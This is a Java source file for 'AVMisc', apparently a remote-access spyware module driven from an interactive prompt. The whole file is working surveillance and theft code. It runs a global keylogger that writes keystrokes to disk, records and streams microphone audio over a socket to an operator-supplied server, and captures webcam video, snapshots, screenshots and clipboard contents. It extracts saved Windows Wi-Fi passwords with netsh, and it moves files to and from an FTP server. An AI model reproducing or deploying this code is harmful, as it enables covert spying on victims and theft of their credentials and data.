package com.AVMisc;

import java.awt.AWTException;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.datatransfer.Clipboard;
import java.awt.datatransfer.DataFlavor;
import java.awt.datatransfer.Transferable;
import java.awt.datatransfer.UnsupportedFlavorException;
import java.awt.image.BufferedImage;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.Socket;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.Arrays;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Scanner;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.logging.Level;
import java.util.logging.Logger;
import java.util.stream.Collectors;
import java.util.InputMismatchException;

import javax.imageio.ImageIO;
import javax.sound.sampled.AudioSystem;
import javax.sound.sampled.Mixer.Info;

import org.apache.commons.net.ftp.FTPClient;
import org.apache.commons.net.ftp.FTPReply;
import org.jcodec.api.awt.AWTSequenceEncoder;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import de.ralleytn.simple.audio.Audio;
import de.ralleytn.simple.audio.AudioEvent;
import de.ralleytn.simple.audio.AudioException;
import de.ralleytn.simple.audio.Recorder;
import de.ralleytn.simple.audio.StreamedAudio;

import com.github.sarxos.webcam.Webcam;
import com.github.sarxos.webcam.WebcamException;



public class AVMisc implements NativeKeyListener {
	private static final DateTimeFormatter dtf = DateTimeFormatter.ofPattern("MM_dd_YYYY_HH_mm_ss");
	private static final DateTimeFormatter logDTF = DateTimeFormatter.ofPattern("MM-dd-YYYY HH:mm:ss");
	private static final String OS = System.getProperty("os.name");
	private long AUDIO_RECORD_TIME = 0;
	private AtomicBoolean recordingAudio = new AtomicBoolean();
	private AtomicBoolean playingAudio = new AtomicBoolean();
	private AtomicBoolean stopStreaming = new AtomicBoolean();
	private AtomicBoolean recordingVideo = new AtomicBoolean();
	private Scanner sc = new Scanner(System.in);
	private Thread recordingAudioThread;
	private Thread playingAudioThread;
	private Thread recordingVideoThread;
	private FTPClient ftp;
	private String recordingAudioFileName;
	private String playingAudioFileName;
	private Audio audio;
	private Recorder recorder;
	private String streamingAudioIP;
	private int streamingAudioPort;
	private int recordingAudioTime;
	private boolean KLIsRunning = false;
	private boolean shiftIsDown = false;
	private Path klFilePath = Paths.get("file.txt");
	private Path klLogFilePath = Paths.get("log.txt");
	

	public static void main(String[] args) {
		AVMisc av = new AVMisc();
		av.begin();
	}
	
	public AVMisc() {
		recordingAudio.set(false);
		playingAudio.set(false);
		stopStreaming.set(false);
		recordingVideo.set(false);
		Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
		logger.setLevel(Level.OFF);
		logger.setUseParentHandlers(false);
		
	}
	
	
	private void begin() {
		String command;
		while (true) {
			System.out.print("av_misc>");
			command = sc.nextLine();
			switch (command.toLowerCase()) {
				case "list":
					listAudioDevices();
					listVideoDevices();
					break;
				case "start_audio_record":
					recordAudio(false);
					break;
				case "stop_audio_record":
					stopRecordingAudio();
					break;
				case "start_audio_playback":
					playAudio();
					break;
				case "stop_audio_playback":
					stopPlayingAudio();
					break;
				case "start_streaming_audio":
					recordAudio(true);
					break;
				case "stop_streaming_audio":
					stopRecordingAudio();
					break;
				case "start_video_record":
					recordVideo();
					break;
				case "stop_video_record":
					stopRecordingVideo();
					break;
				case "screenshot":
					takeScreenshot();
					break;
				case "snapshot":
					takeSnapshot();
					break;
				case "start_kl":
					startKeylogger();
					break;
				case "stop_kl":
					stopKeylogger();
					break;
				case "wifi":
					getWifiInfo();
					break;
				case "clipboard":
					showClipboardContents();
					break;
				case "upload":
					upload();
					break;
				case "download":
					download();
					break;
				case "help":
					showHelp();
					break;
				case "quit":
				case "exit":
					if(KLIsRunning) { stopKeylogger(); }
					System.exit(0);
				default:
					System.out.printf("'%s' is not a recognized command. Type 'help' for a list of available commands.\n", command);
			}
		}
	}
	
	/***
	 * List Devices
	 */
	private void listAudioDevices() {
		Info[] audioSystem = AudioSystem.getMixerInfo();
		if(audioSystem.length != 0) {
			System.out.println("------------------------\n     AUDIO DEVICES\n------------------------");
			for (int i = 0; i < audioSystem.length; i++) {
				Info device = audioSystem[i];
				System.out.printf("\tID: %d, Name: %s, Description: %s\n\n", i, device.getName(), device.getDescription());
			}
		}
		audioSystem = null;
	}
	
	private void listVideoDevices() {
		List<Webcam> webcams = Webcam.getWebcams();
		if(webcams.size() != 0) {
			System.out.println("\n------------------------\n     VIDEO DEVICES\n------------------------");
			webcams.forEach((webcam) -> {
				System.out.printf("\tName: %s\n", webcam.getName());
			});
		}
		else {
			System.out.println("\nNo video devices");
		}
	}
	
	/***
	 * Record Audio
	 */
	private void recordAudio(boolean streaming) {
		if (!recordingAudio.get()) {
			if(streaming) {
				// Get the IP address and port
				System.out.print("Enter the IP address of the server: ");
				streamingAudioIP = sc.nextLine();
				System.out.print("Enter the port number: ");
				streamingAudioPort = Integer.parseInt(sc.nextLine());
			}
			else {
				try {
					// Get the time to record the audio
					System.out.print("Enter the record time in seconds: ");
					recordingAudioTime = Integer.parseInt(sc.nextLine());
					if (recordingAudioTime <= 0) {
						throw new NumberFormatException("Time entered is invalid.");
					}
				} 
				catch (NumberFormatException e) {
					System.out.println(e.getMessage());
					return;
				}
			}
			
			recordingAudioThread = new Thread() {
				@Override
				public void run() {
					// Streaming audio
					if(streaming) {
						try {
							Socket socket = new Socket(streamingAudioIP, streamingAudioPort);
							try(DataOutputStream dos = new DataOutputStream(socket.getOutputStream())) {
								recorder = new Recorder();
								recorder.start(dos);
								
								recordingAudio.set(true);
								System.out.println("Streaming audio for 2 minutes...");
								Thread.sleep(120000);
								socket.close();
							} 
							catch (AudioException | IOException e) {
								System.out.println(e.getMessage());
							}
							catch(InterruptedException e) {}
							finally {
								recorder.stop();
								recordingAudio.set(false);
								stopStreaming.set(false);
							}
						}
						catch(NumberFormatException | SecurityException | IOException e) {
							System.out.println(e.getMessage());
						}
					}
					// Recording audio to save to a file
					else {
						AUDIO_RECORD_TIME = recordingAudioTime * 1000;
						recordingAudioFileName = String.format("Audio_%s.au", dtf.format(LocalDateTime.now()));
						
						try(FileOutputStream fos = new FileOutputStream(recordingAudioFileName)) {
							recorder = new Recorder();
							recorder.start(fos);
							recordingAudio.set(true);
							System.out.println("Recording...");
							Thread.sleep(AUDIO_RECORD_TIME);
						} 
						catch (AudioException | IOException e) {
							System.out.println(e.getMessage());
						}
						catch(InterruptedException e) { }
						finally {
							recorder.stop();
							recordingAudio.set(false);
							System.out.printf("Audio recording saved as: '%s'.\n", recordingAudioFileName);
						}
					}
				}
			};
			recordingAudioThread.start();
		}
	}
	
	
	/***
	 * Stop Recording Audio
	 */
	private void stopRecordingAudio() {
		if(recordingAudio.get()) {
			recordingAudioThread.interrupt();
		}
	}
	
	/***
	 * Play Audio
	 */
	private void playAudio() {
		if(!playingAudio.get()) {
			System.out.print("Enter the path of the audio file to play: ");
			String fileName = sc.nextLine();
			playingAudioThread = new Thread() {
				@Override
				public void run() {
					try {
						if(!Files.exists(Paths.get(fileName))) {
							throw new FileNotFoundException(String.format("The file '%s' does not exist.", fileName));
						}
						playingAudioFileName = fileName;
						audio = new StreamedAudio(playingAudioFileName);
						audio.addAudioListener(event -> {
							if(event.getType() == AudioEvent.Type.REACHED_END) {
								event.getAudio().close();
							}
						});
						audio.open();
						audio.play();
						playingAudio.set(true);
					}
					catch(AudioException | FileNotFoundException e) {
						e.printStackTrace();
					}
				}
			};
			playingAudioThread.start();
		}
	}
	
	/***
	 * Stop Playing Audio
	 */
	private void stopPlayingAudio() {
		if(playingAudio.get()) {
			audio.stop();
			audio.close();
			audio = null;
			playingAudio.set(false);
		}
	}
	
	
	/***
	 * Record Video
	 */
	private void recordVideo() {
		if(!recordingVideo.get()) {
			System.out.print("Enter the number of seconds to record (About 500 KB/S): ");
			int seconds = sc.nextInt();
			
			recordingVideoThread = new Thread() {
				public void run() {
					try {
						String fileName = String.format("Video_%s.mp4", dtf.format(LocalDateTime.now()));
						File file = new File(fileName);
						Webcam webcam = Webcam.getDefault();
						recordingVideo.set(true);
						webcam.open();
						
						AWTSequenceEncoder encoder = AWTSequenceEncoder.createSequenceEncoder(file, 25);
						int framesToEncode = seconds * 50;
						BufferedImage image = null;
						System.out.println("Recording");
						
						for(int i = 0; i < framesToEncode/2; i++) {
							image = webcam.getImage();
							encoder.encodeImage(image);
						}
						webcam.close();
						encoder.finish();
						System.out.printf("Video saved as %s", fileName);
						
					}
					catch (InputMismatchException | IOException e) {
						System.out.println(e.getMessage());
					}
					finally {
						recordingVideo.set(false);
					}
				}
			};
			recordingVideoThread.start();
		}
	}
	
	/***
	 * Stop Recording Video
	 */
	private void stopRecordingVideo() {
		if(recordingVideo.get()) {
			recordingVideoThread.interrupt();
		}
	}
	
	/***
	 * Take a Screenshot
	 */
	private void takeScreenshot() {
		try {
			Robot robot = new Robot();
			String fileName = String.format("Screenshot_%s.jpg", dtf.format(LocalDateTime.now()));
			Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
			BufferedImage screenImage = robot.createScreenCapture(screenRect);
			ImageIO.write(screenImage, "jpg", new File(fileName));
			System.out.printf("Screenshot saved as '%s'\n", fileName);
		}
		catch (AWTException | IOException e) {
			System.out.println(e.getMessage());
		}
	}

	
	
	/***
	 * Take a Snapshot
	 */
	private void takeSnapshot() {
		List<Webcam> webcams = Webcam.getWebcams();
		if(webcams.size() > 0) {
			try {
				System.out.print("Enter the webcam name: ");
				String webcamName = sc.nextLine();
				Webcam webcam = Webcam.getWebcamByName(webcamName);
				webcam.open();
				
				BufferedImage image = webcam.getImage();
				String fileName = String.format("Snapshot_%s.png", dtf.format(LocalDateTime.now()));
				ImageIO.write(image, "PNG", new File(fileName));
				webcam.close();
				System.out.printf("Snapshot saved as '%s'\n", fileName);
			}
			catch (WebcamException | NullPointerException | IOException e) {
				System.out.println(e.getMessage());
			}
		}
	}
	
	/***
	 * Start Keylogger
	 */
	private void startKeylogger() {
		if(KLIsRunning) {
			System.out.println("Keylogger is already running");
		}
		else {
			try {
				GlobalScreen.registerNativeHook();
				GlobalScreen.addNativeKeyListener(this);
				
				if(!Files.exists(klFilePath)) {
					Files.createFile(klFilePath);
				}
				if(!Files.exists(klLogFilePath)) {
					Files.createFile(klLogFilePath);
				}
				KLIsRunning = true;
			}
			catch(NativeHookException | IOException e) {
				System.out.println(e.getMessage());
				KLIsRunning = false;
			}
		}
	}
	
	/***
	 * Stop Keylogger
	 */
	private void stopKeylogger() {
		if(KLIsRunning) {
			try {
				GlobalScreen.unregisterNativeHook();
				KLIsRunning = false;
			}
			catch(NativeHookException e) {
				System.out.println(e.getMessage());
			}
		}
	}
	
	/***
	 * Get WiFi Info
	 */
	private void getWifiInfo() {
		// Wifi passwords are only available on Windows
		if (OS.contains("Windows")) {
			try {
				// Execute the command to get all of the wireless profiles
				Process p = Runtime.getRuntime().exec("netsh.exe wlan show profiles");
				BufferedReader in = new BufferedReader(new InputStreamReader(p.getInputStream()));
				String profiles = ""; // Data for all of the wireless profiles
				String val; //Placeholder
				while ((val = in.readLine()) != null) {
					profiles += val + "\n";
				}
				val = null;
				// Create a list of the SSIDs
				List<String> ssids = Arrays.stream(profiles.split("\n"))
						.map(l -> l.trim())
						.filter(l -> l.startsWith("All"))
						.map(l -> l.substring(23))
						.collect(Collectors.toList());
				// Return if there are no wireless profiles
				if (ssids.size() == 0) {
					in.close();
					return;
				}
				String data = ""; // A formatted string of all SSIDs and their passwords
				for (String id : ssids) {
					// Execute the command to get the connection data for each wireless profile
					String cmd = String.format("netsh.exe wlan show profiles name=\"%s\" key=clear", id);
					p = Runtime.getRuntime().exec(cmd);
					in = new BufferedReader(new InputStreamReader(p.getInputStream()));
					String profile = ""; // Data for an individual profile
					while ((val = in.readLine()) != null) {
						profile += val + "\n";
					}
					// Filter the result for each profile to find the line containing the password
					List<String> line = Arrays.stream(profile.split("\n"))
							.map(l -> l.trim())
							.filter(l -> l.startsWith("Key Content"))
							.collect(Collectors.toList());
					// line.size() will be 0 if the wireless profile corresponds to an open network
					if (line.size() > 0) {
						data += String.format("------------------\n\nSSID: %s\nPASSKEY: %s\n\n", 
								id, 
								line.stream()
									.map(l -> l.substring(25))
									.findFirst().get());
					}
				}
				// Write 'data' to the file if 'data' is not empty
				if (!data.equals("")) {
					String fileName = "wifi.txt";
					Files.write(Paths.get(fileName), data.getBytes());
					System.out.printf("Wifi data saved as %s\n", fileName);
				}
				in.close();
				data = null;
			}
			catch (IOException e) {
				System.out.println(e.getMessage());
			}
		}
	}
	
	/***
	 * Upload files
	 */
	private void upload() {
		try {
			if(!connectToFTPServer()) {
				System.out.println(ftp.getReplyString());
			}
			// Continue if the server connection attempt was successful
			else {
				ftp.setFileType(FTPClient.BINARY_FILE_TYPE);
				// Upload a file
				System.out.print("Enter the path of the file to upload: ");
				String filePath = sc.nextLine();
				if(Files.exists(Paths.get(filePath))) {
					String fileName = filePath.substring(filePath.lastIndexOf('\\')+1);
					File file = new File(filePath);
					FileInputStream input = new FileInputStream(file);
					System.out.print("Enter the path to the directory on the server: ");
					String dir = sc.nextLine();
					if(!ftp.storeFile(dir + fileName, input)) {
						System.out.println("There was an error writing the file to the server");
					}
					else {
						System.out.println("Success");
					}
					input.close();
					ftp.disconnect();
				}
				else { throw new FileNotFoundException(); }
			}
		}
		catch(IOException e) {
			System.out.println(e.getMessage());
		}
	}
	
	/***
	 * Download files
	 */
	private void download() {
				try {
					if(!connectToFTPServer()) {
						System.out.println(ftp.getReplyString());
					}
					// Continue if the server connection attempt was successful
					else {
						// Download a file
						System.out.print("Enter the path of the file on the server to download: ");
						String remoteFilePath = sc.nextLine();
						String fileName = remoteFilePath.substring(remoteFilePath.lastIndexOf('/')+1);
						System.out.print("Enter the path of the directory on the local machine (with \\\\): ");
						String localFilePath = sc.nextLine() + fileName;
						File file = new File(localFilePath);
						FileOutputStream output = new FileOutputStream(file);
						if(!ftp.retrieveFile(remoteFilePath, output)) {
							System.out.println("There was an error retrieving the file from the server");
						}
						else {
							System.out.println("Success");
						}
						output.close();
						ftp.disconnect();
					}
				}
				catch(IOException e) {
					System.out.println(e.getMessage());
				}
	}
	
	
	/***
	 * View clipboard contents
	 */
	private void showClipboardContents() {
		Toolkit toolkit = Toolkit.getDefaultToolkit();
		Clipboard clipboard = toolkit.getSystemClipboard();
		try {
			Transferable t = clipboard.getContents(null);
			if(t.isDataFlavorSupported(DataFlavor.stringFlavor)) {
				System.out.printf("String data: %s\n", t.getTransferData(DataFlavor.stringFlavor));
			}
		}
		catch(UnsupportedFlavorException  | IOException e) {
			System.out.println(e.getMessage());
		}
	}

	
	/***
	 * Show Help
	 */
	private void showHelp() {
		LinkedHashMap<String, String> helpItems = new LinkedHashMap<>();
		helpItems.put("list", "List the audio devices on the system");
		helpItems.put("start_audio_record", "Start recording audio on the system");
		helpItems.put("stop_audio_record", "Stop recording audio");
		helpItems.put("start_audio_playback", "Play an audio file on the system");
		helpItems.put("stop_audio_playback", "Stop playing audio");
		helpItems.put("start_streaming_audio", "Connects to a server and starts streaming audio");
		helpItems.put("stop_streaming_audio", "Stop streaming audio");
		helpItems.put("start_video_record", "Start recording video");
		helpItems.put("stop_video_record", "Stop recording video");
		helpItems.put("screenshot", "Take a screenshot");
		helpItems.put("snapshot", "Take a snapshot with the webcam");
		helpItems.put("start_kl", "Start the keylogger");
		helpItems.put("stop_kl", "Stop the keylogger");
		helpItems.put("wifi", "Get the passwords for the wireless profiles on the system(Windows only)");
		helpItems.put("clipboard", "View the contents of the clipboard");
		helpItems.put("upload", "Upload a file to the server");
		helpItems.put("download", "Download a file from the server");
		helpItems.put("help", "Show this help message");
		
		System.out.println("------------------------\n     AVMISC OPTIONS\n------------------------\n");
		helpItems.forEach((key, value) -> {
			System.out.printf("\t'%s': %s\n\n", key, value);
		});
		
	}
	
	
	/********** HELPER METHODS **********/
	private boolean connectToFTPServer() {
		// Get the server IP
		System.out.print("Enter the server IP address: ");
		String ip = sc.nextLine();
		ftp = new FTPClient();
		try {
			ftp.connect(ip);
			int replyCode = ftp.getReplyCode();
			if(!FTPReply.isPositiveCompletion(replyCode)) {
				return false;
			}
			ftp.enterLocalPassiveMode();
			// Login if necessary
			System.out.print("Do you need to login? (y/n): ");
			String response = sc.nextLine();
			if(response.toLowerCase().equals("y")) {
				System.out.print("Enter the username: ");
				String user = sc.nextLine();
				System.out.print("Enter the password: ");
				String pass = sc.nextLine();
				return ftp.login(user, pass);
			}
			return true;
			
		}
		catch(IOException e) {
			System.out.println(e.getMessage());
			return false;
		}
	}


	
	/********** KEYBOARD EVENT HANDLERS **********/
	@Override
	public void nativeKeyPressed(NativeKeyEvent event) {
		try {
			String keyText = ""; // The text written to the basic log file
			String logKeyText = String.format("%s ----- %s\n", NativeKeyEvent.getKeyText(event.getKeyCode()), logDTF.format(LocalDateTime.now()));
			switch(event.getKeyCode()) {
				case NativeKeyEvent.VC_SPACE:
					keyText = " ";
					break;
				case NativeKeyEvent.VC_ENTER:
					keyText = "\n";
					break;
				case NativeKeyEvent.VC_TAB:
					keyText = "\t";
					break;
				case NativeKeyEvent.VC_BACKSPACE:
					byte[] data = Files.readAllBytes(klFilePath);
					byte[] arr = Arrays.copyOf(data, data.length-1);
					Files.deleteIfExists(klFilePath);
					Files.write(klFilePath, arr, StandardOpenOption.CREATE_NEW);
					data = null;
					arr = null;
					break;
				case NativeKeyEvent.VC_BACKQUOTE:
					keyText = shiftIsDown ? "~" : "`";
					break;
				case NativeKeyEvent.VC_1:
					keyText = shiftIsDown ? "!" : "1";
					break;
				case NativeKeyEvent.VC_2:
					keyText = shiftIsDown ? "@" : "2";
					break;
				case NativeKeyEvent.VC_3:
					keyText = shiftIsDown ? "#" : "3";
					break;
				case NativeKeyEvent.VC_4:
					keyText = shiftIsDown ? "$" : "4";
					break;
				case NativeKeyEvent.VC_5:
					keyText = shiftIsDown ? "%" : "5";
					break;
				case NativeKeyEvent.VC_6:
					keyText = shiftIsDown ? "^" : "6";
					break;
				case NativeKeyEvent.VC_7:
					keyText = shiftIsDown ? "&" : "7";
					break;
				case NativeKeyEvent.VC_8:
					keyText = shiftIsDown ? "*" : "8";
					break;
				case NativeKeyEvent.VC_9:
					keyText = shiftIsDown ? "(" : "9";
					break;
				case NativeKeyEvent.VC_0:
					keyText = shiftIsDown ? ")" : "0";
					break;
				case NativeKeyEvent.VC_MINUS:
					keyText = shiftIsDown ? "_" : "-";
					break;
				case NativeKeyEvent.VC_EQUALS:
					keyText = shiftIsDown ? "+" : "=";
					break;
				case NativeKeyEvent.VC_OPEN_BRACKET:
					keyText = shiftIsDown ? "{" : "[";
					break;
				case NativeKeyEvent.VC_CLOSE_BRACKET:
					keyText = shiftIsDown ? "}" : "]";
					break;
				case NativeKeyEvent.VC_BACK_SLASH:
					keyText = shiftIsDown ? "|" : "\\";
					break;
				case NativeKeyEvent.VC_SEMICOLON:
					keyText = shiftIsDown ? ":" : ";";
					break;
				case NativeKeyEvent.VC_QUOTE:
					keyText = shiftIsDown ? "\"" : "'";
					break;
				case NativeKeyEvent.VC_COMMA:
					keyText = shiftIsDown ? "<" : ",";
					break;
				case NativeKeyEvent.VC_PERIOD:
					keyText = shiftIsDown ? ">" : ".";
					break;
				case NativeKeyEvent.VC_SLASH:
					keyText = shiftIsDown ? "?" : "/";
					break;
				case NativeKeyEvent.VC_A:
				case NativeKeyEvent.VC_B:
				case NativeKeyEvent.VC_C:
				case NativeKeyEvent.VC_D:
				case NativeKeyEvent.VC_E:
				case NativeKeyEvent.VC_F:
				case NativeKeyEvent.VC_G:
				case NativeKeyEvent.VC_H:
				case NativeKeyEvent.VC_I:
				case NativeKeyEvent.VC_J:
				case NativeKeyEvent.VC_K:
				case NativeKeyEvent.VC_L:
				case NativeKeyEvent.VC_M:
				case NativeKeyEvent.VC_N:
				case NativeKeyEvent.VC_O:
				case NativeKeyEvent.VC_P:
				case NativeKeyEvent.VC_Q:
				case NativeKeyEvent.VC_R:
				case NativeKeyEvent.VC_S:
				case NativeKeyEvent.VC_T:
				case NativeKeyEvent.VC_U:
				case NativeKeyEvent.VC_V:
				case NativeKeyEvent.VC_W:
				case NativeKeyEvent.VC_X:
				case NativeKeyEvent.VC_Y:
				case NativeKeyEvent.VC_Z:
					keyText = NativeKeyEvent.getKeyText(event.getKeyCode());
					break;
				default:
					break;
			}
			// Check when the shift key is pressed
			if(event.getKeyCode() == NativeKeyEvent.VC_SHIFT) {
				shiftIsDown = true;
			}
			Files.write(klFilePath, keyText.getBytes(), StandardOpenOption.APPEND);
			Files.write(klLogFilePath, logKeyText.getBytes(), StandardOpenOption.APPEND);
		}
		catch (IOException e) {
			System.out.println(e.getMessage());
		}
		
	}

	
	@Override
	public void nativeKeyReleased(NativeKeyEvent event) {
		if(event.getKeyCode() == NativeKeyEvent.VC_SHIFT) {
			shiftIsDown = false;
		}
	}

	@Override
	public void nativeKeyTyped(NativeKeyEvent event) {
		
	}


}
